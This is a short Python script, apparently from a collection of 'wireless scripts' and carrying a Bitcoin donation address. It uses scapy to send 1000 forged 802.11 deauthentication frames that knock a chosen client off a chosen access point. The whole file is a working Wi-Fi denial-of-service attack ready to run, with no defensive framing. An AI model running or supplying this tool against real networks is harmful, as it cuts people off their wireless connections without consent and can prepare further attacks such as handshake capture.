#!/usr/bin/env python

# BTC - 14xMeDbjsyBCtjCLsaKBYLqw4C2Sf145o5

'''
        ######################
        ## WIRELESS SCRIPTS ##
        ######################
'''


import sys
from scapy.all import *

interface = "wlan2"

BSSID = raw_input("Enter the MAC of AP: ")
vic = raw_input("Enter The MAC OF Client: ")

frame = RadioTap()/Dot11(addr1=vic, addr2=BSSID, addr3=BSSID)/Dot11Deauth()

sendp(frame, iface=interface, count=1000, inter= .1)
